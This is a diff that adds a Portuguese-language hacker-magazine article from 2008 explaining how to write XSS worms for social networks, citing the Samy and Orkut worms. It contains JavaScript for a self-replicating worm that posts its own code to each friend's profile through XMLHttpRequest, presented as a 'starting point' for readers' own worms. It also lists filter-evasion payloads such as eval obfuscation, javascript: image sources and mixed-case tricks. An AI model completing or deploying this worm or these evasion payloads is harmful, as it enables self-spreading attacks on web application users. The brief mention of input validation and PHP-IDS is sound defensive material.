@@ -1,0 +1,426 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x03 <---> Edicao 0x01 <---> Artigo 0x06 ]
+
+
+.> 05 de Maio de 2008,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+                              +-+-+-+-+
+                              XSS W0rmS 				
+                              +-+-+-+-+
+
+
+.> 01 de Maio de 2008
+.> lvwr < 3rd.box [at] gmail [dot] com >
+
+
+                    "When you lose fun and start doing things
+                               only for the payback, you are DEAD!"
+                                             -- TCLH, Phrack 65
+
+[ --- Indice
+
++     1.     <--->     Introducao
++     2.     <--->     XSS
++       2.1.  <->        XSS Nao Persistente
++       2.2.  <->        XSS Persistente
++     3.     <--->     Escrevendo o Worm
++     4.     <--->     Tecnicas de evasao
++     5.     <--->     Consideracoes Finais
++     6.     <--->     Agradecimentos
++     7.     <--->     Referencias
+
+
+[ --- 1. Introducao
+
+Apesar de toda a confusao de nomes e termos, essencialmente um worm e' um
+programa capaz de se propagar pela rede, enviando copias de si mesmo, exploran-
+do vulnerabilidades e falhas de configuracao. Um XSS Worm e', assim como um
+worm comum, um programa capaz de se propagar. A grande diferenca entre estes
+tipos de worms e' que, por explorarem falhas relacionadas a injecao de XSS, a
+infeccao ocorre principalmente em aplicacoes web.
+
+Ate' onde se tem noticias, os principais alvos dos XSS Worms tem sido as 
+redes sociais. Em 2005 o MySpace foi vitima de um Worm conhecido como "Samy is
+my hero" [1]. Em menos de 24 horas este Worm se espalhou por diferentes
+"profiles", forcando todos a se tornarem amigos de Samy. O funcionamento do
+worm era simples; Um codigo javascript inserido em alguma parte de algum
+profile  que, quando  renderizado pelo  browser, executava  determinadas requi-
+sicoes. Estas requisicoes nao so copiavam o javascript para o "profile" de
+quem o visualizasse, mas tambem adicionava Samy a sua lista de amigos.
+Recentemente o Orkut (que tanto bomba entre os brasileiros) tambem foi vitima
+de um XSS Worm [2]. De forma semelhante ao "Samy is my hero", este Worm tambem
+era bastante inofensivo, e seu unico efeito era, alem de se enviar para a lista
+de amigos de quem visualizasse o codigo, adicionar a comunidade "Infectados 
+pelo Virus do Orkut" a lista de comunidades.
+
+O objetivo principal deste texto e' descrever alguns conceitos importantes por
+tras da escrita de XSS Worms. Seria bastante complicado escreve-lo sem antes
+discutir algo  sobre XSSs,  porem detalhes a  respeito deste  tipo de vulnera-
+bilidade serao abordados apenas no que tange a escrita dos Worms. Durante esta
+abordagem, veremos ainda que, apesar dos exemplos inofensivos acima ilustrados,
+os XSSs podem ser bastante prejudiciais. Com os conceitos sobre XSS elucidados,
+seguiremos abordando os passos mais importantes na escrita do codigo do Worm,
+descrevendo de maneira simples um engine basico de infeccao. Ao fim, abordare-
+mos rapidamente alguns detalhes sobre tecnicas de evasao.
+
+Conhecimentos previos para a compreensao deste texto nao sao necessarios,
+embora seja recomendado alguma fluencia em AJAX e web em geral. Leitores pode-
+rao encontrar, na sessao de referencias, informacoes complementares.
+
+
+[ --- 2. XSS
+
+Uma vulnerabilidade do tipo XSS, ou Cross-Site Scripting, diz respeito a falhas
+de seguranca onde um usuario mal intencionado consegue injetar algum tipo de
+codigo malicioso ("payload") em uma aplicacao, para que seja posteriormente
+executado na maquina cliente [3]. Estas vulnerabilidades sao encontradas prin-
+cipalmente em aplicacoes web, onde verificacoes de entradas nao sao devidamente
+realizadas e acabam permitindo que alguem insira, por exemplo, trechos de
+codigo escritos em javascript. Quando um browser renderiza a pagina, ele execu-
+ta o codigo inserido, que pode conter funcoes maliciosas.
+
+Talvez o recurso javascript mais interessante para ser utilizado nos "payloads"
+de exploracoes de XSSs seja os XMLHttpRequests() (ou seja la como voce prefira
+chama-lo, na sua versao do IE...). Este recurso, que e' um recurso muito utili-
+zado em aplicacoes AJAX, e' muito util na escrita dos mecanismos de infeccao do
+Worm. Atraves desta funcao, podemos fazer o browser realizar requisicoes HTTP
+invisiveis ao usuario, exatamente como se ele tivesse clicado em um link. Em
+aplicacoes web, as funcoes sao chamadas atraves de requisicoes realizadas com a
+combinacao correta de parametros. Desta forma, pode-se, por exemplo, realizar
+uma requisicao a uma pagina determinada responsavel por adicionar seus amigos
+na sua rede social (ou, quem sabe, mudar sua senha...;]). Mais detalhes sobre
+XMLHttpRequests() podem ser encontrados em [4].
+
+Uma das formas de garantir um pouco mais de seguranca em relacao aos
+XMLHttpRequests e atraves da "Same Origin Policy". Esta medida de seguranca
+serve para garantir que requisicoes do tipo XMLHttpRequestes sejam feitas
+apenas dentro do proprio dominio, isso eh, um site www.xss.com so pode realizar
+este tipo de requisicao para outras paginas dentro de www.xss.com. Isto impede
+a criacao de cross-application XSS Worms e, em alguns casos, pode dificultar o
+furto de certos dados. (In)felizmente, existem diferentes e conhecidas formas
+de burlar a "Same Origin Policy".
+
+Alem das varias possibilidades de exploracao cujos payloads sao baseados em
+XMLHttpRequests, existem ainda varias outras formas interessantes de se tirar
+proveito das vulnerabilidades XSS. Algumas destas aplicacoes poderiam ser
+keyloggers, portscanners, vuln scanners... Detalhes a respeito do Jikto, web
+vuln scanner  desenvolvido em javascript pode ser encontrado  em [5].
+Definitivamente, os XSS nao sao tao inofensivos quanto parecem.
+
+[ --- 2.1. XSS Nao Persistente
+
+O XSS nao persistente se caracteriza por uma vulnerabilidade onde a aplicacao
+utiliza algum dado passado pelo proprio usuario diretamente na geracao pagina.
+Estes dados podem ter sido passados no cabecalho da solicitacao, terem sido
+postados, etc.
+
+Para que este tipo de XSS seja explorado, e' necessario criar as condicoes onde
+o cliente realize o envio do javascript malicioso, evidentemente, sem saber. A
+forma mais comum de realizar isto e atraves do envio de link maliciosos,
+contendo parametros corrompidos com o codigo que desejamos injetar. A forma
+mais complexa (porem mais eficiente e furtiva) talvez seja utilizando um MITM 
+[6] entre o cliente e a aplicacao web.
+
+[ --- 2.2. XSS Persistente
+
+O XSS Persistente  se caracteriza como uma  vulnerabilidade onde dados
+indevidamente verificados sao armazenados de alguma forma pela aplicacao web e,
+posteriormente, utilizadas na geracao das paginas da aplicacao web.
+
+Esta falha pode ser considerada mais simples de se explorar, e permite ataques
+muito mais interessantes do que o primeiro tipo. Aqui nao existe a necessidade
+de manipular um usuario para clicar em um link malicioso ou de interceptar sua
+comunicacao com o servidor.
+
+Para explorar este tipo de falha, primeiro e' necessario identificar uma
+entrada (indevidamente  verificada) de dados que,  posteriormente, sejam
+renderizados em alguma pagina da aplicacao. Esta entrada pode estar presente no
+proprio aplicativo web ou ainda ser qualquer outra fonte de dados externa, como
+logs, e-mails, etc. O proximo passo e' exatamente injetar o payload atraves
+desta entrada encontrada. Sempre que alguma pagina solicitar estes dados cor-
+rompidos, eles serao interpretados como codigo pelo browser e entao serao
+executados. Considerando o que pode ser feito com XMLHttpRequests(), este tipo
+de falha pode ser desastrosa em certos aplicativos web, como webmails ou
+gerenciadores de servicos de rede. 
+
+Aplicacoes que apresentem este tipo de falha sao o cenario adequado para o
+desenvolvimento dos nossos XSS Worms.
+
+
+[ --- 3. Escrevendo o worm
+
+As etapas de desenvolvimento do codigo do Worm podem ser divididas em 3:
+
+           www
+          ( oO)
+W0RM =    ( 1 ) INFECCAO
+          ( 2 ) ACAO
+          ( 3 ) EVASAO
+
+A primeira diz respeito ao engine de propagacao do codigo, responsavel por
+realizar a infeccao de outras paginas. A segunda etapa e' a acao do Worm, o
+que ele faz, se ele realiza requisicoes a outras paginas buscando modificar 
+alguma configuracao, se ele executa scanners de vulnerabilidade em outros 
+sites... enfim, tudo o que ele pode fazer em benefício do criador do Worm.
+A  ultima etapa na verdade consiste na reescrita das duas primeiras partes de 
+forma difusa, isto e, de maneira que possa confundir todos os parsers e filtros
+que buscam detectar entradas maliciosas.
+
+Como estamos discutindo essencialmente Worms, e nao malwares escritos em JS,
+daremos foco principal a escrita dos engines de infeccao, deixando a acao dos
+worms a cargo da imaginacao e pesquisa dos leitores ;). Ao final, abordaremos
+rapidamente algumas tecnicas de evasao, visto que e impossivel determinar um
+mecanismo eficaz para todas as situacoes.
+
+Antes mesmo de iniciar a escrita do Worm e' necessario encontrar um vetor de
+injecao, isto eh, uma entrada de dados que nao seja devidamente verificada onde
+possamos injetar o script com o nosso Worm e que possa, em seguida, ser utili-
+zada pelo proprio Worm, em outras paginas semelhantes, para se replicar.
+Imagine uma rede social hipotetica onde se existe um campo para se enviar
+mensagens (scraps?) aos seus usuarios e cujas verificacoes sao inadequadas.
+Este campo de envio de mensagens pode perfeitamente funcionar como um ponto de
+entrada do nosso Worm para a dita rede social. Para se replicar, o Worm poderia
+utilizar o mesmo campo nos profiles dos demais usuarios. Atraves de requisicoes
+HTTP (com os devidos parametros) para o envio de mensagens, ele poderia enviar
+copias de si mesmo e espalhar pela rede. 
+
+Outro aspecto importante no espalhamento do Worm e' a busca por paginas com os
+profiles dos demais usuarios, para que ele saiba para onde se enviar. Isso pode
+ser feito, por exemplo, atraves do parsing da pagina de amigos da pessoa que
+visualiza o Worm. Assim, ao abrir a pagina contaminada e executar o script:
+
+1* - Worm envia uma mensagem com o proprio codigo para quem o executou
+2* - Worm abre a pagina com a lista de amigos de quem o executou
+3  - Worm faz o parsing da pagina e coleta uma lista de outros profiles
+4* - Worm envia mensagens com o proprio codigo para a lista de profiles 
+     que obteve no passo anterior
+
+* Nestes passos, o Worm executara chamadas a funcao XMLHttpRequest(), exaltando
+a importancia desta funcao.
+
+Note que este engine de infeccao proporciona um espalhamento exponencial, uma
+vez que, ao ser visualizado pela primeira vez, ele se copia para N profiles.
+Esta forma de funcionar aumenta as chances do Worm ser visualizado e,
+novamente, se copiar para uma nova lista de pessoas. Esta caracteristica foi
+responsavel pela grande velocidade de espalhamento vista no Worm "Samy is my
+hero".
+
+Segue um codigo hipotetico de um worm, bastante comentado, demonstrando um
+engine basico de replicacao:
+
+-+-+----------------- W0rM -----------------+-+-
+
+// Worm esta todo dentro da DIV code
+<div id="code">
+<script>
+
+// Funcao basica, para criar objetos XMLHttpRequests() em diferentes 
+browsers
+function createXMLHttpRequest()
+{
+	try{ return new ActiveXObject("Msxml2.XMLHTTP"); }catch(e){}
+	try{ return new ActiveXObject("Microsoft.XMLHTTP"); }catch(e){}
+	try{ return new XMLHttpRequest(); }catch(e){}
+	return null;
+}
+
+// Funcao de infeccao, recebe um identificador que e' utilizado para 
+encontrar
+// os profiles que ele ira infectar
+function infection(id)
+{
+
+  // variavel worm recebe tudo que esta na div code, no caso, o codigo 
+do  
+	// worm
+	var worm = document.getElementById('code'); 
+	
+	// Definicao dos parametros de controle a serem postados.
+	// A mensagem reinsere a DIV code, insere o conteudo desta div 
+(o codigo do
+	// worm), e fecha a div.
+	// Note que a variavel PARAMETROS_DE_CONTROLE e' especifica em 
+cada
+	aplicacao, estando apenas ilustrada abaixo 
+	var send='PARAMETROS_DE_CONTROLE=XXX&msg=<div i'+'d=code>'
+	+encodeURIComponent(worm.innerHTML)+'</di'+'v>';
+	
+	var xml= createXMLHttpRequest();
+	
+	// Abre pagina de mensagens do id passado para realizar infeccao
+	xml.open('POST','mensagens.php?id=' + id,true);
+	
+xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+	
+	// Realiza postagem dos parametros de controle e do codigo do 
+worm
+	xml.send(send);
+	
+	// Apos realizar a postagem, envia um alert informando quem foi 
+infectado.
+	// Este alert, obviamente, nao deve existir para que o worm atue 
+de forma
+	// invisivel
+	xml.onreadystatechange=function(){
+		if(xml.readyState==4){
+			alert(id + ' infected');
+		};
+	};
+};
+
+// Funcao que retorna um vetor com a lista de IDs dos amigos de quem executou o
+// worm. Utilizado pelo worm como referencias de infeccao
+function getFriends(){
+	//
+	// Como e' uma funcao mto especifica para cada tipo de 
+aplicacao, nao
+	// codificaremos...
+	// Pseudo-codigo:
+	//
+	// XMLHttpRequest(pagina de amigos de quem executa o worm);
+	// Vetor = Renderizar(Resultado do XMLHttpRequest);
+	// return Vetor;
+}
+
+// Inicio do codigo principal:
+// Primeiro passo e' pegar o vetor com identificadores de todos os amigos
+a = getFriends();
+
+// Chama a funcao infeccao para cada um dos IDs capturados
+for(var i=0;i<a.length; i++){
+	infection(a);
+}
+// Apos realizar as infeccoes, Worm executa suas acoes especificas
+// Inclua aqui o seu codigo JS preferido...
+
+// Fim do codigo e da DIV code
+</script>
+</div>
+
+-+-+---------+-E0W-+- W0rM -----------------+-+-
+
+Eh claro que, como praticamente tudo em termos de programacao, o codigo acima
+nao e' uma regra no que diz respeito a escrita dos XSS Worms. Mesmo por nao
+estar completo, este codigo e' apenas uma sugestao ou um ponto de partida para
+quem deseja escrever seus proprios Worms.
+
+
+[ --- 4. Evasao
+
+As tecnicas de evasao tambem sao bastante especificas. De qualquer forma,
+tentaremos abordar as tecnicas basicas utilizadas para tentar burlar os filtros
+de JS das aplicacoes. De forma geral, todos estes filtros sao baseados em
+reconhecimento de padroes: Eles procuram palavras que possam ser consideradas
+maliciosas e, consequentemente, tentativas de XSS.
+
+O principio utilizado para burlar estes filtros e' semelhante ao principio
+utilizado para realizar ataques em redes protegidas por IDSs tambem baseados em
+reconhecimento de padroes. Encontrar um formato de payload diferente, que fuja
+aos padroes, mas que nao interfira no resultado do ataque. Obviamente, inserir
+0x90s no codigo nao vai fazer diferenca alguma, por isso, vejamos algumas
+formas de modificar o codigo sem alterar o seu impacto.
+
+- Uso de encondings diferentes, como URL enconding, no lugar dos caracteres
+  comuns
+
+- Uso da funcao eval [6], para evitar a deteccao de outras funcoes.
+  Ex.: eval(.var.inn. + .erHTML = '=*'.); 
+
+- Inserir javascripts atraves de vetores inesperados, como imagens.
+  Ex.: <img src=javascript:alert(&quotXSS&quot)> 
+
+- Alguns filtros podem ser case sensitive, estando vulneraveis a payloads com
+  variacoes de letras maiusculas e minusculas. Ex.: jAvAsCrIpT:
+
+- Tecnicas como DNS Pinning [7] podem ser utilizadas para evitar "same origin
+  policy"
+
+Tecnicas de evasao sao bem ilustradas no XSS Cheat Sheet [8] e podem ser
+facilmente adaptadas a escrita de worms.
+
+Cabe, por fim, citar um eficiente IDS muito interessante para deteccao 
+de tentativas de ataques a aplicacoes web. O PHP-IDS [9] funciona como uma 
+camada de seguranca para aplicacoes desenvolvidas em PHP, reconhecendo 
+tentativas de ataque como XSSs e SQL Injections. Apos detectado o ataque,
+pode-se  facilmente configurar a aplicacao para atuar da melhor forma possivel,
+enviando alertas aos administradores, exigindo mensagens de alerta, encerrando
+uma sessao, ou ate mesmo direcionando o browser para www.iamaturtle.com.
+
+
+[ --- 5. Consideracoes finais
+
+Primeiramente, gostaria  de me desculpar por quaisquer eventuais erros encon-
+trados ao longo do texto. Tive pouquissimo tempo, porem muita disposicao
+para escreve-lo... por isso, tentei me concentrar nas partes mais importantes,
+e acabei deixando as revisoes e correcoes em segundo plano. De qualquer forma
+acredito estar contribuindo de alguma maneira... e afinal, isto e' o que mais
+importa.
+
+Como descrito, os XSS Worms existem e sao bem simples de se implementar.
+Considerando a grande quantidade de malwares escritos em JS, pode-se facilmente
+acoplar os codigos e disparar ataques impactantes sobre diferentes aplicacoes
+web, como redes sociais, webmails, foruns, etc.
+
+Este texto, novamente, ressalta a importancia por tras da verificacao das
+entradas de dados.
+
+Alem disso, compreende-se que XSSs, quando devidamente explorados, pode ser
+bem prejudiciais. SQL Injections e PHP Include Bugs, nao sao os unicos furos de
+seguranca presentes em aplicacoes web.
+
+
+[ --- 6. Agradecimentos
+
+Primeiramente gostaria de agradecer ao meu grande amigo Julio Cesar Fort, pela 
+grande motivacao para iniciar a pesquisa a respeito dos XSS Worms, fato que
+resultou em uma apresentacao chamada "World Wild Worms", na H2HC no ultimo ano 
+e agora neste texto.
+
+Aos amigos Bruno Cardoso, Thiago Bolaum, Guilherme Rezende e Julio Auto. Por 
+serem os hackers que sao.
+
+Finalmente, a todas as iniciativas e movimentos relacionados ao hacking no
+mundo inteiro.
+
+
+[ --- 7. Referencias:
+
+[1] - Technical explanation of The MySpace Worm - 
+      http://namb.la/popular/tech.html
+
+[2] - Como baguncei o orkut em um dia -
+      http://ctrlc.blog.br/2007/12/como-baguncei-o-orkut-em-um-dia.html
+
+[3] - Wikipedia - XSS - 
+      http://en.wikipedia.org/wiki/Cross-site_scripting
+
+[4] - XMLHttpRequests - 
+      http://www.w3.org/TR/XMLHttpRequest/
+
+[5] - Javascript Malware - Spi Dynamics -
+      http://www.slideshare.net/amiable_indian/javascript-malware-spi-dynamics
+
+[6] - Wikipedia - Man in the middle Attack -
+      http://en.wikipedia.org/wiki/Man_in_the_middle_attack
+
+[7] - DNS Pinning Explained -
+      http://christ1an.blogspot.com/2007/07/dns-pinning-explained.html
+
+[8] - XSS Cheat Sheet -
+      http://ha.ckers.org/xss.html
+	
+[9] - PHP-IDS -
+      http://www.php-ids.org
